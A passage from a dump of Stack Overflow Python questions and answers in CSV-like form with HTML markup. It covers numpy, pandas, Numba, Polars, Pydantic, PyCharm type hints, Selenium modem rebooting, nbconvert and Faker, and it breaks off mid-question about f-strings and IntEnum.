</code></pre>
<pre><code>[[ 1.  3.  6. 10.  0.]
 [ 2.  5.  9.  0.  0.]
 [ 4.  8. 13.  0.  0.]
 [ 7. 12.  0.  0.  0.]
 [11.  0.  0.  0.  0.]]
</code></pre>
<p>works, but there must be a more efficient way. Most likely via Numpy, but I cannot find a solution.</p>
","73555372","<p>The assignment can be completed in one step by simply transforming the index of the lower triangle:</p>
<pre><code>def fill_diagonal(n):
    assert n &gt; 0
    m = int((2 * n - 1.75) ** 0.5 + 0.5)
    '''n &gt;= ((1 + (m - 1)) * (m - 1)) / 2 + 1
    =&gt; 2n - 2 &gt;= m ** 2 - m
    =&gt; 2n - 7 / 4 &gt;= (m - 1 / 2) ** 2
    =&gt; (2n - 7 / 4) ** (1 / 2) + 1 / 2 &gt;= m for n &gt; 0
    =&gt; m = floor((2n - 7 / 4) ** (1 / 2) + 1 / 2)
    or n &lt;= ((1 + m) * m) / 2
    =&gt; (2n + 1 / 4) ** (1 / 2) - 1 / 2 &lt;= m for n &gt; 0
    =&gt; m = ceil((2n + 1 / 4) ** (1 / 2) - 1 / 2)
    '''
    i, j = np.tril_indices(m)
    i -= j
    ret = np.zeros((m, m), int)
    ret[i[:n], j[:n]] = np.arange(1, n + 1)
    return ret
</code></pre>
<p>Test:</p>
<pre><code>&gt;&gt;&gt; for i in range(1, 16):
...     print(repr(fill_diagonal(i)), end='\n\n')
...
array([[1]])

array([[1, 0],
       [2, 0]])

array([[1, 3],
       [2, 0]])

array([[1, 3, 0],
       [2, 0, 0],
       [4, 0, 0]])

array([[1, 3, 0],
       [2, 5, 0],
       [4, 0, 0]])

array([[1, 3, 6],
       [2, 5, 0],
       [4, 0, 0]])

array([[1, 3, 6, 0],
       [2, 5, 0, 0],
       [4, 0, 0, 0],
       [7, 0, 0, 0]])

array([[1, 3, 6, 0],
       [2, 5, 0, 0],
       [4, 8, 0, 0],
       [7, 0, 0, 0]])

array([[1, 3, 6, 0],
       [2, 5, 9, 0],
       [4, 8, 0, 0],
       [7, 0, 0, 0]])

array([[ 1,  3,  6, 10],
       [ 2,  5,  9,  0],
       [ 4,  8,  0,  0],
       [ 7,  0,  0,  0]])

array([[ 1,  3,  6, 10,  0],
       [ 2,  5,  9,  0,  0],
       [ 4,  8,  0,  0,  0],
       [ 7,  0,  0,  0,  0],
       [11,  0,  0,  0,  0]])

array([[ 1,  3,  6, 10,  0],
       [ 2,  5,  9,  0,  0],
       [ 4,  8,  0,  0,  0],
       [ 7, 12,  0,  0,  0],
       [11,  0,  0,  0,  0]])

array([[ 1,  3,  6, 10,  0],
       [ 2,  5,  9,  0,  0],
       [ 4,  8, 13,  0,  0],
       [ 7, 12,  0,  0,  0],
       [11,  0,  0,  0,  0]])

array([[ 1,  3,  6, 10,  0],
       [ 2,  5,  9, 14,  0],
       [ 4,  8, 13,  0,  0],
       [ 7, 12,  0,  0,  0],
       [11,  0,  0,  0,  0]])

array([[ 1,  3,  6, 10, 15],
       [ 2,  5,  9, 14,  0],
       [ 4,  8, 13,  0,  0],
       [ 7, 12,  0,  0,  0],
       [11,  0,  0,  0,  0]])
</code></pre>
<p>For the case of large n, the performance is about 10 to 20 times that of the loop solution:</p>
<pre><code>%timeit fill_diagonal(10 ** 5)
1.63 ms ± 94.5 µs per loop (mean ± std. dev. of 7 runs, 1,000 loops each)
%timeit fill_diagonal_loop(10 ** 5)    # OP's solution
25.1 ms ± 218 µs per loop (mean ± std. dev. of 7 runs, 10 loops each)
</code></pre>
"
"73561079","1","Yet another combinations with conditions question","<p>I want to efficiently generate pairs of elements from two lists equal to their Cartesian product with some elements omitted. The elements in each list are unique.</p>
<p>The code below does exactly what's needed but I'm looking to optimize it perhaps by replacing the loop.</p>
<p>See the comments in the code for details.</p>
<p>Any advice would be appreciated.</p>
<pre><code>from itertools import product
from pprint import pprint as pp

def pairs(list1, list2):
    &quot;&quot;&quot; Return all combinations (x,y) from list1 and list2 except:
          1. Omit combinations (x,y) where x==y &quot;&quot;&quot;
    tuples = filter(lambda t: t[0] != t[1], product(list1,list2))

    &quot;&quot;&quot;   2. Include only one of the combinations (x,y) and (y,x) &quot;&quot;&quot;
    result = []
    for t in tuples:
        if not (t[1], t[0]) in result:
            result.append(t)
    return result

list1 = ['A', 'B', 'C']
list2 = ['A', 'D', 'E']
pp(pairs(list1, list1))  #  Test a list with itself
pp(pairs(list1, list2))  #  Test two lists with some common elements
</code></pre>
<p>Output</p>
<pre><code>[('A', 'B'), ('A', 'C'), ('B', 'C')]
[('A', 'D'),
 ('A', 'E'),
 ('B', 'A'),
 ('B', 'D'),
 ('B', 'E'),
 ('C', 'A'),
 ('C', 'D'),
 ('C', 'E')]
</code></pre>
","73575445","<p>About 5-6 times faster than the fastest in your answer's benchmark. I build sets of values that appear in both lists or just one, and combine them appropriately without further filtering.</p>
<pre><code>from itertools import product, combinations

def pairs(list1, list2):
    a = {*list1}
    b = {*list2}
    ab = a &amp; b
    return [
        *product(a, b-a),
        *product(a-b, ab),
        *combinations(ab, 2)
    ]
</code></pre>
<p>You could also make it an iterator (because unlike previous solutions, I don't need to store the already produced pairs to filter further ones):</p>
<pre><code>from itertools import product, combinations, chain

def pairs(list1, list2):
    a = {*list1}
    b = {*list2}
    ab = a &amp; b
    return chain(
        product(a, b-a),
        product(a-b, ab),
        combinations(ab, 2)
    )
</code></pre>
"
"73137036","1","""Expected type"" warning from changing dictionary value from None type to str type within a function (Pycharm IDE)","<p>I have a dictionary for which the key <code>&quot;name&quot;</code> is initialized to <code>None</code> (as this be easily used in <code>if name:</code> blocks) if a name is read in it is then assigned to name.</p>
<p>All of this works fine but Pycharm throws a warning when &quot;name&quot; is changed due to the change in type. While this isn't the end of the world it's a pain for debugging (and could be a pain for maintaining the code). Does anyone know if there is a way either to provide something akin to a type hint to the dictionary or failing that to tell Pycharm the change of type is intended?</p>
<p>code replicating issue:</p>
<pre><code>from copy import deepcopy

test = {
    &quot;name&quot;: None,
    &quot;other_variables&quot;: &quot;Something&quot;
}


def read_info():
    test_2 = deepcopy(test)
    test_2[&quot;name&quot;] = &quot;this is the name&quot;  # Pycharm shows warning
    return test_2[&quot;name&quot;]
</code></pre>
<p>ideal solution:</p>
<pre><code>from copy import deepcopy

test = {
    &quot;name&quot;: None type=str,
    &quot;other_variables&quot;: &quot;Something&quot;
}


def read_info():
    test_2 = deepcopy(test)
    test_2[&quot;name&quot;] = &quot;this is the name&quot;  # no warning
    return test_2[&quot;name&quot;]
</code></pre>
<p>Note:
I know that setting the default value to <code>&quot;&quot;</code> would behave the same but a) it's handy having it print out &quot;None&quot; if name is printed before assignment and b) I find it slightly more readable to have <code>None</code> instead of <code>&quot;&quot;</code>.</p>
<p>Note_2:
I am unaware why (it may be a bug or intended for some reason I don't understand) but Pycharm only gives a wanrning if the code shown above is found within a function. i.e. replacing the <code>read_info()</code> function with the lines:</p>
<pre><code>test_2 = deepcopy(test)
test_2[&quot;name&quot;] = &quot;this is the name&quot;  # Pycharm shows warning
</code></pre>
<p>Does not give a warning</p>
","73137424","<p>Type hinting that dictionary with <code>dict[str, None | str]</code> (Python 3.10+, older versions need to use <code>typing.Dict[str, typing.Optional[str]]</code>) seems to fix this:</p>
<pre class=""lang-py prettyprint-override""><code>from copy import deepcopy

test: dict[str, None | str] = {
    &quot;name&quot;: None,
    &quot;other_variables&quot;: &quot;Something&quot;
}


def read_info():
    test_2 = deepcopy(test)
    test_2[&quot;name&quot;] = &quot;this is the name&quot;  # no warning
    return test_2[&quot;name&quot;]
</code></pre>
<p>As noticed by @Tomerikoo simply type hinting as <code>dict</code> also works (this should work on all? Python versions that support type hints too):</p>
<pre class=""lang-py prettyprint-override""><code>test: dict = {
    &quot;name&quot;: None,
    &quot;other_variables&quot;: &quot;Something&quot;
}
</code></pre>
"
"72249268","1","Pandas drop rows lower then others in all colums","<p>I have a dataframe with a lot of rows with numerical columns, such as:</p>
<div class=""s-table-container"">
<table class=""s-table"">
<thead>
<tr>
<th>A</th>
<th>B</th>
<th>C</th>
<th>D</th>
</tr>
</thead>
<tbody>
<tr>
<td>12</td>
<td>7</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>7</td>
<td>1</td>
<td>2</td>
<td>0</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>2</td>
<td>2</td>
<td>0</td>
<td>0</td>
</tr>
</tbody>
</table>
</div>
<p>I need to reduce the size of the dataframe by removing those rows that has another row with all values bigger.
In the previous example i need to remove the last row because the first row has all values bigger (in case of dubplicate rows i need to keep one of them).
And return This:</p>
<div class=""s-table-container"">
<table class=""s-table"">
<thead>
<tr>
<th>A</th>
<th>B</th>
<th>C</th>
<th>D</th>
</tr>
</thead>
<tbody>
<tr>
<td>12</td>
<td>7</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>7</td>
<td>1</td>
<td>2</td>
<td>0</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
</tbody>
</table>
</div>
<p>My faster solution are the folowing:</p>
<pre><code>    def complete_reduction(df, columns):
        def _single_reduction(row):
            df[&quot;check&quot;] = True
            for col in columns:
                df[&quot;check&quot;] = df[&quot;check&quot;] &amp; (df[col] &gt;= row[col])
            drop_index.append(df[&quot;check&quot;].sum() == 1)
        df = df.drop_duplicates(subset=columns)
        drop_index = []
        df.apply(lambda x: _single_reduction(x), axis=1)
        df = df[numpy.array(drop_index).astype(bool)]
        return df
</code></pre>
<p>Any better ideas?</p>
<hr />
<p>Update:</p>
<p>A new solution has been found here
<a href=""https://stackoverflow.com/a/68528943/11327160"">https://stackoverflow.com/a/68528943/11327160</a>
but i hope for somethings faster.</p>
","72368866","<p>An more memory-efficient and faster solution than the one proposed so far is to use <strong>Numba</strong>. There is no need to create huge temporary array with Numba. Moreover, it is easy to write a <em>parallel implementation</em> that makes use of all CPU cores. Here is the implementation:</p>
<pre class=""lang-py prettyprint-override""><code>import numba as nb

@nb.njit
def is_dominated(arr, k):
    n, m = arr.shape
    for i in range(n):
        if i != k:
            dominated = True
            for j in range(m):
                if arr[i, j] &lt; arr[k, j]:
                    dominated = False
            if dominated:
                return True
    return False

# Precompile the function to native code for the most common types
@nb.njit(['(i4[:,::1],)', '(i8[:,::1],)'], parallel=True, cache=True)
def dominated_rows(arr):
    n, m = arr.shape
    toRemove = np.empty(n, dtype=np.bool_)
    for i in nb.prange(n):
        toRemove[i] = is_dominated(arr, i)
    return toRemove

# Special case
df2 = df.drop_duplicates()

# Main computation
result = df2[~dominated_rows(np.ascontiguousarray(df.values))]
</code></pre>
<hr />
<h2>Benchmark</h2>
<p>The input test is two random dataframes of shape 20000x5 and 5000x100 containing small integers (ie. <code>[0;100[</code>). Tests have been done on a (6-core) i5-9600KF processor with 16 GiB of RAM on Windows. The version of @BingWang is the updated one of the 2022-05-24. Here are performance results of the proposed approaches so far:</p>
<pre class=""lang-py prettyprint-override""><code>Dataframe with shape 5000x100
 - Initial code:   114_340 ms
 - BENY:             2_716 ms  (consume few GiB of RAM)
 - Bing Wang:        2_619 ms
 - Numba:              303 ms  &lt;----

Dataframe with shape 20000x5
 - Initial code:    (too long)
 - BENY:             8.775 ms  (consume few GiB of RAM)
 - Bing Wang:          578 ms
 - Numba:               21 ms  &lt;----
</code></pre>
<p>This solution is respectively about <strong>9 to 28 times faster</strong> than the fastest one (of @BingWang). It also has the benefit of <strong>consuming far less memory</strong>. Indeed, the @BENY implementation consume few GiB of RAM while this one (and the one of @BingWang) only consumes no more than few MiB for this used-case. The speed gain over the @BingWang implementation is due to the <em>early stop</em>, parallelism and the native execution.</p>
<p>One can see that this Numba implementation and the one of @BingWang are quite efficient when the number of column is small. This makes sense for the @BingWang since the complexity should be <code>O(N(logN)^(d-2))</code> where <code>d</code> is the number of columns. As for Numba, it is significantly faster because most rows are dominated on the second random dataset causing the early stop to be very effective in practice. I think the @BingWang algorithm might be faster when most rows are not dominated. However, this case should be very uncommon on dataframes with few columns and a lot of rows (at least, clearly on uniformly random ones).</p>
"
"72610552","1","""Most Replayed"" Data of Youtube Video via API","<p>Is there any way to extract the &quot;Most Replayed&quot; (aka Video Activity Graph) Data from a Youtube video via API?</p>
<p>What I'm referring to:</p>
<p><a href=""https://i.stack.imgur.com/z2okz.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/z2okz.png"" alt=""Image of Youtube Video with &quot;Most Replayed&quot; Data displayed"" /></a></p>
","72624653","<p>One more time YouTube Data API v3 doesn't provide a basic feature.</p>
<p>I recommend you to try out my <a href=""https://github.com/Benjamin-Loison/YouTube-operational-API/commit/ee7ff583a2150d1121ffe8f3195a1cf9101aefdb#diff-515c409ddb619da28c52829262e517f3d2ab4910aaa2ab60dd88e9064e0cfd4fR172-R173"" rel=""nofollow noreferrer"">open-source</a> <a href=""https://yt.lemnoslife.com"" rel=""nofollow noreferrer"">YouTube operational API</a>. Indeed by fetching <a href=""https://yt.lemnoslife.com/videos?part=mostReplayed&amp;id=VIDEO_ID"" rel=""nofollow noreferrer"">https://yt.lemnoslife.com/videos?part=mostReplayed&amp;id=VIDEO_ID</a>, you will get the <em>most replayed</em> graph values you are looking for in <code>item[&quot;mostReplayed&quot;][&quot;heatMarkers&quot;][&quot;heatMarkerRenderer&quot;][&quot;heatMarkerIntensityScoreNormalized&quot;]</code>.</p>
<p>With the video id <a href=""https://www.youtube.com/watch?v=XiCrniLQGYc"" rel=""nofollow noreferrer""><code>XiCrniLQGYc</code></a> you would get:</p>
<pre><code>{
    &quot;kind&quot;: &quot;youtube#videoListResponse&quot;,
    &quot;etag&quot;: &quot;NotImplemented&quot;,
    &quot;items&quot;: [
        {
            &quot;kind&quot;: &quot;youtube#video&quot;,
            &quot;etag&quot;: &quot;NotImplemented&quot;,
            &quot;id&quot;: &quot;XiCrniLQGYc&quot;,
            &quot;mostReplayed&quot;: {
                &quot;maxHeightDp&quot;: 40,
                &quot;minHeightDp&quot;: 4,
                &quot;showHideAnimationDurationMillis&quot;: 200,
                &quot;heatMarkers&quot;: [
                    {
                        &quot;heatMarkerRenderer&quot;: {
                            &quot;timeRangeStartMillis&quot;: 0,
                            &quot;markerDurationMillis&quot;: 2580,
                            &quot;heatMarkerIntensityScoreNormalized&quot;: 1
                        }
                    },
                    ...
                ],
                &quot;heatMarkersDecorations&quot;: [
                    {
                        &quot;timedMarkerDecorationRenderer&quot;: {
                            &quot;visibleTimeRangeStartMillis&quot;: 0,
                            &quot;visibleTimeRangeEndMillis&quot;: 7740,
                            &quot;decorationTimeMillis&quot;: 2580,
                            &quot;label&quot;: {
                                &quot;runs&quot;: [
                                    {
                                        &quot;text&quot;: &quot;Most replayed&quot;
                                    }
                                ]
                            },
                            &quot;icon&quot;: &quot;AUTO_AWESOME&quot;,
                            &quot;trackingParams&quot;: &quot;CC0Q38YIGGQiEwiFxcqD7-P9AhX8V08EHcIFCg8=&quot;
                        }
                    }
                ]
            }
        }
    ]
}
</code></pre>
"
"73155924","1","Inheritance/subclassing issue in Pydantic","<p>I came across a <a href=""https://christophergs.com/tutorials/ultimate-fastapi-tutorial-pt-7-sqlalchemy-database-setup/"" rel=""noreferrer"">code snippet</a> for declaring Pydantic Models. The inheritance used there has me confused.</p>
<pre><code>class RecipeBase(BaseModel):
  label: str
  source: str
  url: HttpUrl


class RecipeCreate(RecipeBase):
  label: str
  source: str
  url: HttpUrl
  submitter_id: int


class RecipeUpdate(RecipeBase):
  label: str
</code></pre>
<p>I am not sure what's the benefit of inheriting from RecipeBase in the RecipeCreate and RecipeUpdate class. The part that has me confused is that after inheritance also, why does one has to re-declare label, source, and URL, which are already part of the  RecipeBase class in the  RecipeCreate class?</p>
","73159535","<p>I’d say it is an oversight from the tutorial. There is no benefit and only causes confusion. Typically, Base is used for all overlapping fields, and they are only overloaded when they change type (for example, <code>XyzBase</code> has <code>name: str</code> whereas <code>XyzCreate</code> has <code>name: str|None</code> because it doesn’t has to be provided when updating an instance.</p>
<p>The tutorial is doing a bad job explaining why the setup is as it is.</p>
"
"73199376","1","RequestsDependencyWarning: urllib3 (1.26.11) or chardet (3.0.4) doesn't match a supported version error using Selenium and ChromeDriverManager","<p>I have this script to acess my internet modem and reboot the device, but stop to work some weeks ago. Here my code:</p>
<pre><code>from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
service = Service(executable_path=ChromeDriverManager().install())
driver = webdriver.Chrome(service=service)
from selenium.webdriver.common.by import By

chrome_options = Options()
chrome_options.add_argument('--headless')
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--disable-dev-shm-usage')

driver = webdriver.Chrome(ChromeDriverManager().install(),options=chrome_options)

driver.get('http://192.168.15.1/me_configuracao_avancada.asp',)
user = driver.find_element(By.ID, &quot;txtUser&quot;)
user.send_keys(&quot;support&quot;)
btnLogin = driver.find_element(By.ID, &quot;btnLogin&quot;)
btnLogin.click()
driver.get('http://192.168.15.1/reboot.asp',)
reboot = driver.find_element(By.ID, &quot;btnReboot&quot;)
reboot.click()
print(&quot;Modem Reiniciado!&quot;)
</code></pre>
<p>now when i run, this error messages return:</p>
<pre><code>/usr/lib/python3/dist-packages/requests/__init__.py:89: RequestsDependencyWarning: urllib3 (1.26.11) or chardet (3.0.4) doesn't match a supported version!
  warnings.warn(&quot;urllib3 ({}) or chardet ({}) doesn't match a supported &quot;
Traceback (most recent call last):
  File &quot;modem.py&quot;, line 7, in &lt;module&gt;
    driver = webdriver.Chrome(service=service)
  File &quot;/home/fabio/.local/lib/python3.8/site-packages/selenium/webdriver/chrome/webdriver.py&quot;, line 69, in __init__
    super().__init__(DesiredCapabilities.CHROME['browserName'], &quot;goog&quot;,
  File &quot;/home/fabio/.local/lib/python3.8/site-packages/selenium/webdriver/chromium/webdriver.py&quot;, line 92, in __init__
    super().__init__(
  File &quot;/home/fabio/.local/lib/python3.8/site-packages/selenium/webdriver/remote/webdriver.py&quot;, line 277, in __init__
    self.start_session(capabilities, browser_profile)
  File &quot;/home/fabio/.local/lib/python3.8/site-packages/selenium/webdriver/remote/webdriver.py&quot;, line 370, in start_session
    response = self.execute(Command.NEW_SESSION, parameters)
  File &quot;/home/fabio/.local/lib/python3.8/site-packages/selenium/webdriver/remote/webdriver.py&quot;, line 435, in execute
    self.error_handler.check_response(response)
  File &quot;/home/fabio/.local/lib/python3.8/site-packages/selenium/webdriver/remote/errorhandler.py&quot;, line 247, in check_response
    raise exception_class(message, screen, stacktrace)
selenium.common.exceptions.WebDriverException: Message: unknown error: Chrome failed to start: exited abnormally.
  (unknown error: DevToolsActivePort file doesn't exist)
  (The process started from chrome location /usr/bin/google-chrome is no longer running, so ChromeDriver is assuming that Chrome has crashed.)
Stacktrace:
#0 0x561e346d9cd3 &lt;unknown&gt;
#1 0x561e344e1968 &lt;unknown&gt;
#2 0x561e3450625c &lt;unknown&gt;
#3 0x561e345018fa &lt;unknown&gt;
#4 0x561e3453c94a &lt;unknown&gt;
#5 0x561e34536aa3 &lt;unknown&gt;
#6 0x561e3450c3fa &lt;unknown&gt;
#7 0x561e3450d555 &lt;unknown&gt;
#8 0x561e347212bd &lt;unknown&gt;
#9 0x561e34725418 &lt;unknown&gt;
#10 0x561e3470b36e &lt;unknown&gt;
#11 0x561e34726078 &lt;unknown&gt;
#12 0x561e346ffbb0 &lt;unknown&gt;
#13 0x561e34742d58 &lt;unknown&gt;
#14 0x561e34742ed8 &lt;unknown&gt;
#15 0x561e3475ccfd &lt;unknown&gt;
#16 0x7fc22f8b9609 &lt;unknown&gt;
</code></pre>
<p>Some weeks ago this code run without any problems, but now i'm stuck
I'm using Google Chrome 103.0.5060.134 and ChromeDriver 103.0.5060.134.</p>
","73199422","<p>This error message...</p>
<pre><code>/usr/lib/python3/dist-packages/requests/__init__.py:89: RequestsDependencyWarning: urllib3 (1.26.11) or chardet (3.0.4) doesn't match a supported version!
  warnings.warn(&quot;urllib3 ({}) or chardet ({}) doesn't match a supported &quot;
</code></pre>
<p>...implies that the <code>requests</code> module is backdated hence not in sync and needs an update.</p>
<hr />
<h2>Solution</h2>
<p>You can update the <code>requests</code> module using either of the following commands:</p>
<pre><code>pip3 install requests
</code></pre>
<p>or</p>
<pre><code>pip3 install --upgrade requests
</code></pre>
"
"70552618","1","VScode fails to export Jupyter notebook to HTML - 'jupyter-nbconvert` not found","<p>I keep on getting error message:</p>
<pre><code>Available subcommands: 1.0.0
Jupyter command `jupyter-nbconvert` not found.
</code></pre>
<p>I've tried to reinstall <code>nbconvert</code> using pip to no use. I've also tried the tip from this thread with installing pip install jupyter in vscode terminal but it shows that <code>&quot;Requirement already satisfied&quot;</code>
<a href=""https://stackoverflow.com/questions/64535664/vscode-fails-to-export-jupyter-notebook-to-html"">VSCode fails to export jupyter notebook to html</a></p>
<p>I've also tried to manually edit jupyter settings.json file to the following:</p>
<pre><code>&quot;python.pythonPath&quot;: &quot;C:\\Users\\XYZ\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.9_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python39\\Scripts&quot;
</code></pre>
<p>I've python 3.9 installed via windows store.
Any tip on what might be the issue for vscode doesn't want to export the notebook?</p>
","72369322","<p>Unsure exactly what fixed the issue but heres a summary.</p>
<ol>
<li>Updated to python 3.10</li>
<li>Installed pandoc and miktex</li>
<li>Powershell reinstall nbconvert</li>
</ol>
<ul>
<li>Received warning that nbconvert script file is installed in a location not in Path.</li>
<li>Copied said location to System Properties - Envionment Variables - Path</li>
</ul>
<ol start=""4"">
<li>Restart and install all miktex package on the go</li>
</ol>
<p>PDF export and HTML export seems to work as intended now.</p>
"
"73203318","1","How to transform Spark dataframe to Polars dataframe?","<p>I wonder how i can transform Spark dataframe to Polars dataframe.</p>
<p>Let's say i have this code on PySpark:</p>
<pre><code>df = spark.sql('''select * from tmp''')
</code></pre>
<p>I can easily transform it to pandas dataframe using <code>.toPandas</code>.
Is there something similar in polars, as I need to get a polars dataframe for further processing?</p>
","73205690","<h2>Context</h2>
<p>Pyspark uses arrow to convert to pandas. Polars is an abstraction over arrow memory. So we can hijack the API that spark uses internally to create the arrow data and use that to create the polars <code>DataFrame</code>.</p>
<h2>TLDR</h2>
<p>Given an spark context we can write:</p>
<pre class=""lang-py prettyprint-override""><code>import pyarrow as pa
import polars as pl

sql_context = SQLContext(spark)

data = [('James',[1, 2]),]
spark_df = sql_context.createDataFrame(data=data, schema = [&quot;name&quot;,&quot;properties&quot;])

df = pl.from_arrow(pa.Table.from_batches(spark_df._collect_as_arrow()))

print(df)
</code></pre>
<pre><code>shape: (1, 2)
┌───────┬────────────┐
│ name  ┆ properties │
│ ---   ┆ ---        │
│ str   ┆ list[i64]  │
╞═══════╪════════════╡
│ James ┆ [1, 2]     │
└───────┴────────────┘
</code></pre>
<h2>Serialization steps</h2>
<p>This will actually be faster than the <code>toPandas</code> provided by <code>spark</code> itself, because it saves an extra copy.</p>
<p><code>toPandas()</code> will lead to this serialization/copy step:</p>
<p><code>spark-memory -&gt; arrow-memory -&gt; pandas-memory</code></p>
<p>With the query provided we have:</p>
<p><code>spark-memory -&gt; arrow/polars-memory</code></p>
"
"73206810","1","Faker Python generating chinese/pinyin names","<p>I am trying to generate random chinese names using Faker (Python), but it generates the names in chinese characters instead of pinyin.</p>
<p>I found this :
<img src=""https://i.stack.imgur.com/bimJ0.png"" alt=""enter image description here"" /></p>
<p>and it show that it generates them in pinyin, while when I try the same code, it gives me only chinese characters.</p>
<p>how to get the pinyin ??</p>
","73206894","<p><code>fake.romanized_name()</code> worked for me.</p>
<p>I got lucky by looking through <code>dir(fake)</code>. Doesn't seem to have a method for pinyin address that I can see...</p>
"
"73641835","1","Unnesting event parameters in JSON format within a Pandas dataframe","<p>I have a dataset that looks like the one below.  It is relational, but has a dimension called <code>event_params</code> which is a JSON object of data related to the <code>event_name</code> in the respective row.</p>
<pre><code>import pandas as pd

a_df = pd.DataFrame(data={
    'date_time': ['2021-01-03 15:12:42', '2021-01-03 15:12:46', '2021-01-03 15:13:01'
                  , '2021-01-03 15:13:12', '2021-01-03 15:13:13', '2021-01-03 15:13:15'
                  , '2021-01-04 03:29:01', '2021-01-04 18:15:14', '2021-01-04 18:16:01'],
    'user_id': ['dhj13h', 'dhj13h', 'dhj13h', 'dhj13h', 'dhj13h', 'dhj13h', '38nr10', '38nr10', '38nr10'],
    'account_id': ['181d9k', '181d9k', '181d9k', '181d9k', '181d9k', '181d9k', '56sf15', '56sf15', '56sf15'],
    'event_name': ['button_click', 'screen_view', 'close_view', 'button_click', 'exit_app', 'uninstall_app'
                   , 'install_app', 'exit_app', 'uninstall_app'],
    'event_params': ['{\'button_id\': \'shop_screen\', \'button_container\': \'main_screen\', \'button_label_text\': \'Enter Shop\'}',
                     '{\'screen_id\': \'shop_main_page\', \'screen_controller\': \'main_view_controller\', \'screen_title\': \'Main Menu\'}',
                     '{\'screen_id\': \'shop_main_page\'}',
                     '{\'button_id\': \'back_to_main_menu\', \'button_container\': \'shop_screen\', \'button_label_text\': \'Exit Shop\'}',
                     '{}',
                     '{}',
                     '{\'utm_campaign\': \'null\', \'utm_source\': \'null\'}',
                     '{}',
                     '{}']
    })
</code></pre>
<p><strong>I am looking for approaches on how to handle this sort of data.  My initial approach is with pandas, but I'm open to other methods.</strong></p>
<p>My ideal end state would be to examine each relationships with respect to each user.  In the current form, I have to compare the dicts/JSON blobs sitting in <code>event_params</code> to determine the context behind an event.</p>
<p>I've tried using <code>explode()</code> to expand out the <code>event_params</code> column.  My thinking is the best sort of approach would be to turn <code>event_params</code> into a relational format, where each parameter is an extra row of the dataframe with respect to it's preceding values (in other words, while maintaining the <code>date_time</code>, <code>user_id</code> and <code>event_name</code> that it was related too initially).</p>
<p>My explode approach didn't work well,</p>
<pre><code>a_df['event_params'] = a_df['event_params'].apply(eval)
exploded_df = a_df.explode('event_params')
</code></pre>
<p>The output of that was:</p>
<pre><code>date_time, user_id, account_id, event_name, event_params
2021-01-03 15:12:42,dhj13h,181d9k,button_click,button_id
2021-01-03 15:12:42,dhj13h,181d9k,button_click,button_container
</code></pre>
<p>It has kind of worked, but it stripped the value fields.  Ideally I'd like to maintain those value fields as well.</p>
","73641899","<p>I hope I've understood your question right. You can transform the <code>event_params</code> column from dict to list of dicts, explode it and transform to new columns <code>key</code>/<code>value</code>:</p>
<pre class=""lang-py prettyprint-override""><code>from ast import literal_eval


a_df = a_df.assign(
    event_params=a_df[&quot;event_params&quot;].apply(
        lambda x: [{&quot;key&quot;: k, &quot;value&quot;: v} for k, v in literal_eval(x).items()]
    )
).explode(&quot;event_params&quot;)

a_df = pd.concat(
    [a_df, a_df.pop(&quot;event_params&quot;).apply(pd.Series)],
    axis=1,
).drop(columns=0)

print(a_df)
</code></pre>
<p>Prints:</p>
<pre class=""lang-none prettyprint-override""><code>             date_time user_id account_id     event_name                key                 value
0  2021-01-03 15:12:42  dhj13h     181d9k   button_click          button_id           shop_screen
0  2021-01-03 15:12:42  dhj13h     181d9k   button_click   button_container           main_screen
0  2021-01-03 15:12:42  dhj13h     181d9k   button_click  button_label_text            Enter Shop
1  2021-01-03 15:12:46  dhj13h     181d9k    screen_view          screen_id        shop_main_page
1  2021-01-03 15:12:46  dhj13h     181d9k    screen_view  screen_controller  main_view_controller
1  2021-01-03 15:12:46  dhj13h     181d9k    screen_view       screen_title             Main Menu
2  2021-01-03 15:13:01  dhj13h     181d9k     close_view          screen_id        shop_main_page
3  2021-01-03 15:13:12  dhj13h     181d9k   button_click          button_id     back_to_main_menu
3  2021-01-03 15:13:12  dhj13h     181d9k   button_click   button_container           shop_screen
3  2021-01-03 15:13:12  dhj13h     181d9k   button_click  button_label_text             Exit Shop
4  2021-01-03 15:13:13  dhj13h     181d9k       exit_app                NaN                   NaN
5  2021-01-03 15:13:15  dhj13h     181d9k  uninstall_app                NaN                   NaN
6  2021-01-04 03:29:01  38nr10     56sf15    install_app       utm_campaign                  null
6  2021-01-04 03:29:01  38nr10     56sf15    install_app         utm_source                  null
7  2021-01-04 18:15:14  38nr10     56sf15       exit_app                NaN                   NaN
8  2021-01-04 18:16:01  38nr10     56sf15  uninstall_app                NaN                   NaN
</code></pre>
"
"72405196","1","Append 1 for the first occurence of an item in list p that occurs in list s, and append 0 for the other occurence and other items in s","<p>I want this code to append 1 for the first occurence of an item in list p that occurs in list s, and append 0 for the other occurence and other items in s.</p>
<p>That's my current code below and it is appending 1 for all occurences, I want it to append 1 for the first occurence alone. Please, help</p>
<pre><code>s = [20, 39, 0, 87, 13, 0, 23, 56, 12, 13]
p = [0, 13]
bin = []

for i in s:
        if i in p:        
            bin.append(1)      
        else:
            bin.append(0)
   

print(bin)

# current result [0, 0, 1, 0, 1, 1, 0, 0, 0, 1]
# excepted result [0, 0, 1, 0, 1, 0, 0, 0, 0, 0]
</code></pre>
","72405259","<p>The simplest solution is to remove the item from list <code>p</code> if found:</p>
<pre class=""lang-py prettyprint-override""><code>s = [20, 39, 0, 87, 13, 0, 23, 56, 12, 13]
p = [0, 13]

out = []
for i in s:
    if i in p:
        out.append(1)
        p.remove(i)
    else:
        out.append(0)

print(out)
</code></pre>
<p>Prints:</p>
<pre><code>[0, 0, 1, 0, 1, 0, 0, 0, 0, 0]
</code></pre>
"
"72449482","1","f-string representation different than str()","<p>I had always thought that f-strings invoked the <code>__str__</code> method.  That is, <code>f'{x}'</code> was always the same as <code>str(x)</code>.  However, with this class</p>
<pre class=""lang-py prettyprint-override""><code>class Thing(enum.IntEnum):
    A = 0
</code></pre>
